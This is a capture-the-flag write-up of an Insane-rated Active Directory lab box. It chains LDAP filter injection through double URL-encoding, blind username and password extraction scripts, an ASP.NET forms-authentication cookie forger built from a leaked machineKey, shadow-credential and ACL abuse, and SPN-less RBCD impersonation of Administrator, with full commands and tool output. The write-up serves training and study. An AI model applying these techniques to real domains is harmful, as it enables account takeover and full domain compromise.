Summary

Hercules is an Insane-rated Active Directory box where NTLM is completely disabled, forcing Kerberos-only authentication throughout. The attack chain is long and multi-staged:

  1. LDAP filter injection in a web SSO login form, discovered via double URL-encoding bypass of a regex blacklist
  2. Blind username enumeration using a custom "anchor-account" oracle trick to work around an ambiguous error-message oracle
  3. Blind LDAP attribute extraction to pull a leaked password from a user's description field
  4. Kerberos password spray to find the account the leaked credential actually belongs to
  5. Path traversal / LFI on an authenticated file-download endpoint to leak web.config, exposing the ASP.NET machineKey
  6. Forged .ASPXAUTH FormsAuthentication ticket using the leaked machineKey, escalating to a web_admin role
  7. Bad-ODT upload to coerce an internal NetNTLMv2 authentication, captured via Responder and cracked offline
  8. BloodHound-style ACL abuse chain: GenericWrite → Shadow Credentials → OU reparent → Shadow Credentials again → ForceChangePassword → User Flag
  9. OU takeover on a "Forest Migration" OU, re-enabling a disabled account
  10. ESC3 (Certificate Request Agent) abuse to mint a certificate on behalf of another user
  11. Scheduled task abuse (aCleanup.ps1) to briefly re-enable a disabled service-management account
  12. SPN-less Resource-Based Constrained Delegation using the NT-hash/session-key equalization trick, enabling S4U2Self+U2U → S4U2Proxy while impersonating Administrator
  13. DCSync → Root Flag

03

LDAP Injection Discovery

The Username Field's Client-Side Regex — viewing the /Login page source revealed a data-val-regex on the Username field:

<input ... data-val-regex="Invalid Username"
  data-val-regex-pattern="^[^!&quot;#&amp;&#39;()*+,\:;&lt;=>?[\]^`{|}~]+$" ... />

Decoded, the pattern rejects any username containing: ! " # & ' ( ) * + , : ; < = > ? [ ] ^ \ ` { | } ~ — exactly the character set needed for LDAP filter injection.

Confirming Server-Side Enforcement — using curl with a fresh anti-forgery token each time (ASP.NET MVC double-submit CSRF pattern):

curl -sk -c cookies.txt https://hercules.htb/login -o login_page.html
grep -o 'name="__RequestVerificationToken"[^>]*value="[^"]*"' login_page.html

Baseline test — valid username, wrong password:

curl -sk -b cookies.txt -c cookies.txt -X POST https://hercules.htb/login \
  --data-urlencode "__RequestVerificationToken=<TOKEN>" \
  --data-urlencode "Username=admin" \
  --data-urlencode "Password=wrongpass" \
  --data-urlencode "RememberMe=false" \
  -D - -o baseline_response.html

Result: "Invalid login attempt". Injecting a raw single-quote (admin') gave "Invalid Username" — blocked server-side too. So the blacklist is enforced both client- and server-side. Time to test the double-encoding bypass.

Double URL-Encoding Bypass — a single quote URL-encodes once to %27. Double-encoding it (% → %25) gives %2527. A small Python helper pre-encoded only the blacklisted characters, letting the outer HTTP layer add the second layer:

from urllib.parse import quote

BANNED = set(list(r'''!"#&'()*+,:;<=>?[]\^`{|}~'''))

def encode(s: str) -> str:
    out = []
    for c in s:
        if c in BANNED:
            out.append(quote(c, safe=""))
        else:
            out.append(c)
    return "".join(out)

Testing admin%2527 (double-encoded quote) against the login endpoint returned "Invalid login attempt" (NOT "Invalid Username"). The bypass works. The ASP.NET pipeline decodes %2527 twice before it reaches the LDAP filter builder, so the regex (which only sees the raw, once-decoded %27) never rejects it, but the final LDAP query receives a literal '.

Confirming LDAP Wildcard Injection & the Filter Boundary

PayloadResult
admin*"Invalid login attempt"
*"Login attempt failed"

Two distinct messages — a genuine oracle. Testing filter-breakout syntax:

admin*)(description=*)   → blank page / "Invalid Username" (malformed filter)
admin*)(description=*    → "Invalid login attempt" (valid — trailing ) supplied by app)

This confirms the backend wraps user input as (&(sAMAccountName=<INPUT>)(...rest of filter...)). Our injected ) closes the sAMAccountName clause early, and removing our own trailing ) lets the app's own closing parens complete the filter validly.

The Real Meaning of the Two Messages (Important Correction) — the initial assumption (matching one reference writeup) was "Login attempt failed" = unique match, "Invalid login attempt" = no match. This was empirically wrong for this instance:

tests = ['admin*', 'zzzzznonexistentxyz*', '*']
# admin*                 -> invalid_login_attempt=True   (1 real match)
# zzzzznonexistentxyz*   -> invalid_login_attempt=True   (0 matches!)
# *                      -> login_attempt_failed=True    (many matches)

admin* (1 match) and a fake user (0 matches) produced the same message — the oracle only distinguishes "≤1 match" from "2+ matches", not "0" from "1". This would have produced massive false positives in a naive DFS enumeration.

The Anchor-Account Fix — since admin is a confirmed real account, an OR-clause anchor shifted the ambiguous "0 vs 1" case into the reliable "1 vs 2+" case:

def build_anchor_filter(prefix: str) -> str:
    # *)(|(sAMAccountName=admin)(sAMAccountName=<prefix>*)
    return f"*)(|(sAMAccountName=admin)(sAMAccountName={prefix}*)"

Prefix matches 0 real users → total matches = 1 (just admin) → "Invalid login attempt". Prefix matches 1+ real users → total matches = 2+ → "Login attempt failed" (distinguishable). Verified:

zzzzznonexistentxyz -> login_attempt_failed=False  (correctly: no real match)
a                   -> login_attempt_failed=True   (correctly: many real matches)
s                   -> login_attempt_failed=True
j                   -> login_attempt_failed=True
admin               -> login_attempt_failed=False  (LDAP dedupes; anchor + admin = still 1 unique DN)
Why this matteredThis "anchor trick" — OR-ing a known-true condition into a filter to convert an ambiguous 0-vs-1 oracle into a reliable N-vs-N+1 oracle — was the single most important insight of the whole engagement; it's what made automated enumeration trustworthy.
04

Blind Username Enumeration (DFS)

A DFS username enumerator was built using the anchor-filter oracle, plus an exact-match check (no wildcard) to confirm a candidate was a complete username:

def build_anchor_filter(prefix):
    return f"*)(|(sAMAccountName=admin)(sAMAccountName={prefix}*)"

# Grammar assumed: first[.last]
def _next_chars(prefix):
    has_dot = '.' in prefix
    if not prefix: return letters
    if not has_dot: return letters + ('.' if prefix[-1].isalpha() else '')
    return letters

For every node: probe the wildcard filter; if a real match exists, also test the exact (non-wildcard) filter to see if this exact string is itself a complete username; then recurse into all 26(+dot) children regardless (since e.g. two names can coexist as both a prefix and a complete name).

Token management required care — ASP.NET's anti-forgery cookie/token pair could only be reused ~6 times before needing a refresh:

class TokenManager:
    def __init__(self, max_uses=6):
        ...
    def send(self, username_payload, password="wrongPassword"):
        if self._uses >= self.max_uses or not self._cookie_tok:
            self.refresh()
        ...

Ran in background, completed in roughly 30–40 minutes (a-z sweep with dot-splitting), yielding 38 usernames plus a manually-confirmed 39th (an underscore-separated account outside the DFS grammar).

Why this matteredBlind enumeration through a boolean oracle scales fine once the oracle itself is trustworthy — the real engineering cost here was building and validating the oracle, not the DFS traversal logic itself.
05

Blind LDAP Attribute Extraction (Description Field)

Checking Which Users Have a description Set — a simple existence check per user (no anchor trick needed, since we're testing a known-real single user):

def build_desc_exists(username):
    return f"{username})(description=*"
    # real user + has description -> "Login attempt failed"
    # real user + no description  -> "Invalid login attempt"

Ran against all 39 usernames — only one account returned has_description=True.

Character-by-Character Extraction

def ldap_escape(s):
    # RFC4515 escaping for LDAP metacharacters
    return s.replace('\\', r'\5c').replace('*', r'\2a') \
             .replace('(', r'\28').replace(')', r'\29').replace('\x00', r'\00')

def build_prefix_probe(username, prefix):
    return f"{username})(description={ldap_escape(prefix)}*"

For each position, try every character in string.printable; the first one that flips the response to "Login attempt failed" is appended and the loop continues. Extraction ran to completion, recovering a leaked credential value: <LEAKED_DESCRIPTION_PASSWORD>. This matches the pattern of an administrator embedding a "temporary" password directly into an AD description field — a very common real-world misconfiguration.

Why this matteredCharacter-by-character blind extraction through a binary oracle is slow but completely reliable once the oracle itself is validated — patience and correct escaping matter more than cleverness here.

08

Forging the .ASPXAUTH Cookie

First Attempt: Mono + a Community C# Tool (Failed) — cloned a .NET Framework 4.8 console app wrapping System.Web.Security.FormsAuthentication.Encrypt/Decrypt.

  • dotnet build failed: .NET Framework 4.8 reference assemblies aren't available on the dotnet SDK.
  • Installed Mono (mono-devel) and compiled with mcs -r:System.Web.dll.
  • Hit a NullReferenceException in FormsAuthentication.Initialize() → MapUrl() — Mono's FormsAuthentication expects an HttpContext/virtual path that doesn't exist in a console app. Worked around via reflection.
  • Got the tool running, but self-consistency held (Mono could decrypt its own tickets) while decrypting the real server's captured cookie always failed ("Decrypt failed" / signature errors).
  • Root cause found by comparing raw ticket sizes: Mono's self-generated ticket was 96 bytes; the real server's captured ticket was 160 bytes for similarly-sized data. Mono's FormsAuthentication implementation uses an older/simpler ticket format and does not implement the modern "Framework45" anti-padding-oracle scheme the real IIS server uses. This was a dead end — not a config problem, a genuine implementation gap in Mono.

Working Solution: AspNetCore.LegacyAuthCookieCompat (NuGet) — a pure .NET Standard library (no System.Web dependency at all) that explicitly implements both Framework20SP2 and Framework45 compatibility modes:

mkdir -p ~/tools/CookieForge && cd ~/tools/CookieForge
dotnet new console -o .
dotnet add package AspNetCore.LegacyAuthCookieCompat

Program.cs:

using System;
using AspNetCore.LegacyAuthCookieCompat;

class Program
{
    static void Main(string[] args)
    {
        string decryptionKeyHex = "<DECRYPTION_KEY>";
        string validationKeyHex = "<VALIDATION_KEY>";

        byte[] decryptionKeyBytes = HexUtils.HexToBinary(decryptionKeyHex);
        byte[] validationKeyBytes = HexUtils.HexToBinary(validationKeyHex);

        if (args[0] == "decrypt")
        {
            foreach (var sha in new[] { ShaVersion.Sha256, ShaVersion.Sha1 })
            {
                try
                {
                    var encryptor = new LegacyFormsAuthenticationTicketEncryptor(
                        decryptionKeyBytes, validationKeyBytes, sha);
                    var ticket = encryptor.DecryptCookie(args[1]);
                    Console.WriteLine($"[+] SUCCESS with {sha}");
                    Console.WriteLine($"Name: {ticket.Name}, UserData: {ticket.UserData}");
                    return;
                }
                catch (Exception ex) { Console.WriteLine($"[-] Failed with {sha}: {ex.Message}"); }
            }
        }
        else if (args[0] == "encrypt")
        {
            string username = args.Length > 1 ? args[1] : "web_admin";
            int hours = args.Length > 2 && int.TryParse(args[2], out var h) ? h : 8;
            var ticket = new FormsAuthenticationTicket(
                1, username, DateTime.UtcNow, DateTime.UtcNow.AddHours(hours),
                true, "Web Administrators", "/");

            foreach (var sha in new[] { ShaVersion.Sha256, ShaVersion.Sha1 })
            {
                var encryptor = new LegacyFormsAuthenticationTicketEncryptor(decryptionKeyBytes, validationKeyBytes, sha);
                Console.WriteLine($"=== {sha} ===\n{encryptor.Encrypt(ticket)}\n");
            }
        }
    }
}

BloodHound-Style ACL Chain → User Flag

impacket-getTGT hercules.htb/'natalie.a':'<NATALIE_PASSWORD>' -dc-ip <TARGET_IP>
export KRB5CCNAME=natalie.a.ccache

bloodhound-python -dc dc.hercules.htb -d hercules.htb \
  -u natalie.a -p '<NATALIE_PASSWORD>' -k -ns <TARGET_IP> --zip -c All
INFO: Found 49 users, 62 groups, 2 gpos, 9 ous, 19 containers

GenericWrite on bob.w → Shadow Credentials — manual ACE inspection via bloodyAD confirmed WriteProperty rights over name/distinguishedName on bob.w (granted via a group SID, not natalie.a's own SID directly — the ACL was inherited/group-based):

export KRB5CCNAME=natalie.a.ccache
certipy-ad shadow auto -u 'natalie.a@HERCULES.HTB' -k -no-pass \
  -dc-host dc.hercules.htb -account 'bob.w' -ns <TARGET_IP>
[*] NT hash for 'bob.w': <NT_HASH>

Reparenting stephen.m into bob.w's Controlled OU — bob.w held the same WriteProperty pattern over stephen.m (originally in a Security Department OU). Attempted the classic ldapmodify -Y GSSAPI MODRDN approach first:

cat > mov.ldif << 'EOF'
dn: CN=Stephen Miller,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
changetype: modrdn
newrdn: CN=Stephen Miller
deleteoldrdn: 1
newsuperior: OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
EOF

export KRB5CCNAME=bob.w.ccache
ldapmodify -H ldap://DC.HERCULES.HTB -Y GSSAPI -f mov.ldif
ldap_sasl_interactive_bind: Local error (-2)
  GSSAPI Error: Server not found in Kerberos database

Extensive troubleshooting (documented for anyone hitting the same issue):

  • Confirmed the TGT itself was valid (klist)
  • Confirmed impacket-getST could get a service ticket for the exact same SPN fine — ruling out an actual SPN registration problem
  • KRB5_TRACE=/dev/stdout revealed the system's MIT Kerberos library was silently requesting the lowercase, no-DC-prefix SPN instead of the one specified — reverse-DNS-based hostname canonicalization inside libldap/cyrus-sasl's GSSAPI mechanism, occurring before krb5.conf's rdns = false setting could apply (that setting only affects MIT krb5's own internal lookups, not libldap's independent canonicalization step)
  • Tried SASL_NOCANON on in /etc/ldap/ldap.conf and LDAPSASL_NOCANON=yes env var — neither fixed it, canonicalization happens deeper in cyrus-sasl's GSSAPI plugin itself

Working solution: bypass the system Kerberos/SASL stack entirely and use bloodyAD's pure-Python ldap3-based connection instead:

export KRB5CCNAME=bob.w.ccache
bloodyAD -H dc.hercules.htb -d HERCULES.HTB -u 'bob.w' -k \
  set object 'stephen.m' distinguishedName \
  -v 'CN=Stephen Miller,OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb'
[+] stephen.m's distinguishedName has been updated

Shadow Credentials on stephen.m

export KRB5CCNAME=natalie.a.ccache
certipy-ad shadow auto -u 'natalie.a@HERCULES.HTB' -k -no-pass \
  -dc-host dc.hercules.htb -account 'stephen.m' -ns <TARGET_IP>
[*] NT hash for 'stephen.m': <NT_HASH>

export KRB5CCNAME=stephen.m.ccache
bloodyAD -H dc.hercules.htb -d HERCULES.HTB -u 'stephen.m' -k \

Shell as auditor → User Flag

impacket-getTGT hercules.htb/'auditor':'<RESET_PASSWORD>' -dc-ip <TARGET_IP>
export KRB5CCNAME=auditor.ccache

evil-winrm v3.9's Kerberos flags caused early confusion: -k is actually the private-key certificate flag, not "use Kerberos." The correct invocation is -r <realm> -K <ccache_file>:

evil-winrm -i dc.hercules.htb -r HERCULES.HTB -S -K auditor.ccache -u auditor
*Evil-WinRM* PS C:\Users\auditor\Documents> type C:\Users\auditor\Desktop\user.txt
User Flag

(Evil-WinRM crashed with a Ruby memory error on session exit right after — a known cosmetic bug, harmless since the flag already printed.)

Why this matteredThis is a textbook BloodHound-style chain: each hop's privilege is small on its own (write one attribute, request one certificate) but composes into a full path once the graph is walked correctly. Shadow Credentials is a particularly clean primitive since it needs no password reset on the target account at all — just an attacker-supplied key.

SPN-less RBCD via NT-Hash/Session-Key Trick

Confirming the Delegation Setup

bloodyAD -H dc.hercules.htb -d HERCULES.HTB -u 'iis_administrator' -k \
  get object 'DC$' --attr msDS-AllowedToActOnBehalfOfOtherIdentity
msDS-AllowedToActOnBehalfOfOtherIdentity: O:S-1-5-32-544D:(A;;0xf01ff;;;S-1-5-21-...-1124)

The SID confirmed as iis_webserver$ — the DC already trusts this account for Resource-Based Constrained Delegation. iis_administrator (via Service Operators) holds ForceChangePassword on it:

bloodyAD -H dc.hercules.htb -d HERCULES.HTB -u 'iis_administrator' -k \
  set password 'iis_webserver$' '<RESET_PASSWORD_3>'
[+] Password changed successfully!

The Problem: No SPN on iis_webserver$ — it's a user account (not a computer account, despite the $ suffix), so it has no SPN. Standard S4U2Self requires a service to request tickets to itself, which normally needs an SPN. The workaround is S4U2Self with U2U (User-to-User) authentication, but U2U tickets are encrypted with the requesting service's TGT session key, not its long-term key — meaning a normal S4U2Proxy request afterward fails, because the KDC tries to decrypt using the account's long-term NT hash, which doesn't match the session key.

The trick: overwrite the account's actual NT hash to equal the TGT's session key, so the two become the same value and S4U2Proxy's decryption succeeds.

# 1. Compute NT hash of the new password
python3 -c "
import hashlib
print(hashlib.new('md4', '<RESET_PASSWORD_3>'.encode('utf-16le')).hexdigest())
"
# <NT_HASH>

# 2. Get a TGT using that NT hash
impacket-getTGT hercules.htb/'iis_webserver$' -hashes ':<NT_HASH>' -dc-ip <TARGET_IP>

# 3. Extract the TGT's session key
describeTicket.py 'iis_webserver$.ccache'
Ticket Session Key : <SESSION_KEY>
# 4. Overwrite the account's NT hash to equal the session key
export KRB5CCNAME=iis_webserver\$.ccache
changepasswd.py -newhashes ':<SESSION_KEY>' \
  HERCULES.HTB/'iis_webserver$':'<RESET_PASSWORD_3>'@DC.HERCULES.HTB -k -dc-ip <TARGET_IP>
[*] Password was changed successfully.

Note: bloodyAD's password-set synchronizes all key types (NT + AES); impacket's changepasswd.py -newhashes changes only the NT (RC4) hash, leaving the TGT (obtained with -hashes, hence RC4-based) internally consistent. Using bloodyAD here would have broken the trick.

S4U2Self+U2U → S4U2Proxy

export KRB5CCNAME=iis_webserver\$.ccache
getST.py -k -no-pass -u2u -impersonate 'Administrator' \
  -spn 'cifs/DC.HERCULES.HTB' HERCULES.HTB/'iis_webserver$' -dc-ip <TARGET_IP>
[*] Impersonating Administrator
[*] Requesting S4U2self+U2U
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_DC.HERCULES.HTB@HERCULES.HTB.ccache

Success — the KDC accepted the impersonated CIFS ticket for Administrator.

Why this matteredRBCD doesn't require a computer account or an SPN. The NT-hash/session-key equalization trick lets a plain user account participate in S4U2Self+U2U/S4U2Proxy delegation despite having no SPN — critical to know that syncing all key types versus touching only the NT hash behave very differently, and only the latter preserves the trick.

Key Lessons

  1. Regex blacklists on raw input are fragile. Blocking LDAP metacharacters client- and server-side still failed here because the character % itself was never blocked, and the ASP.NET pipeline silently decoded the input twice — turning a "safe" blacklist into a bypassable one via double URL-encoding.
  2. A boolean oracle isn't automatically a clean 3-state oracle. The naive assumption that "different error message = user exists" broke down because the observed messages only distinguished "≤1 match" from "2+ matches" — not "0" from "1". OR-ing in a known-true anchor condition converts an ambiguous oracle into a reliable one; this generalizes to any blind-injection scenario with a "unique result vs multiple results" distinction.
  3. LFI on authenticated endpoints is still LFI. Requiring a low-privilege login didn't stop path traversal on the download handler from leaking the entire web.config, including cryptographic material.
  4. A leaked machineKey means full authentication bypass, but the specific .NET compatibility mode matters a great deal for tooling — Mono's implementation does not implement the modern anti-padding-oracle ticket format, silently producing wrong (but not obviously "broken") output. Community .NET-Standard reimplementations that explicitly support both modes are far more reliable for offline/cross-platform ticket forgery than trying to run Microsoft's real code under Mono.
  5. GSSAPI/Kerberos tooling on Linux has real footguns around hostname canonicalization. krb5.conf's rdns setting does not control every layer — libldap/cyrus-sasl's own reverse-DNS-based SPN canonicalization can silently request the wrong service principal name even when MIT krb5 itself is configured correctly. Pure-Python tools that implement their own Kerberos/LDAP stacks sidestep this class of bug entirely.
  6. Small windows matter. The scheduled-task abuse required chaining several commands immediately after triggering the script, before an automated process re-disabled the target account — a reminder that some AD attack paths are genuinely time-sensitive, not just conceptually multi-step.
  7. RBCD doesn't require a computer account or an SPN. The NT-hash/session-key equalization trick lets a plain user account participate in S4U2Self+U2U/S4U2Proxy delegation despite having no SPN.
